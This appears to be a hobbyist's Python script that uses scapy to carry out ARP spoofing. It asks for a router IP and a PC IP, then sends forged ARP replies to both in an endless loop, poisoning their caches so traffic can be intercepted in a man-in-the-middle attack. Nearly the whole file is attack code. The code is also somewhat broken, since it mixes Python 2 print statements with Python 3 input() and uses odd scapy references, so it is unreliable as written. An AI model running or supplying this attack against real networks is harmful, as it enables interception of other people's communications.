#!/usr/bin/python
#!/usr/bin/scapy.all
#!/Users/matthew/Desktop/pythonhacks/scapy
#https://stackoverflow.com/questions/46602880/importerror-no-module-named-scapy-all
import os
#os.sys.path.append('/usr/local/lib/python2.7/site-packages')
print(os.sys.path)

import socket
from scapy.all import *

routerip = input("Enter the public IP: ")
pcip = input("Enter the private IP: ")

def get_target_mac(ip):
    arp_request = scapy.all.ARP(pdst=ip)
#    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.all.srp(finalpacket, timeout=3, verbose=False)[0]
    print len(answer)
    if len(answer) == 0:
        return
    mac = answer[0][1].hwsrc
    return(mac)

def spoof_arp(target_ip,spoofed_ip):
    mac = get_target_mac(target_ip)
    #print mac
    packet = scapy.all.ARP(op=2,hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.all.send(packet, verbose=False)
    verbose = False
    if verbose:
        self_mac = ARP().hwsrc
        #print "format(target_ip, host_ip, self_mac)" + format(target_ip, spoofed_ip, self_mac)
               
def main():
    iter = 0
    try:
        while True:
            spoof_arp(routerip,pcip)
            spoof_arp(pcip,routerip)
            iter = iter + 1;
            print iter
    except KeyboardInterrupt:
        print "Detected interrupt"
        exit(0)

main()

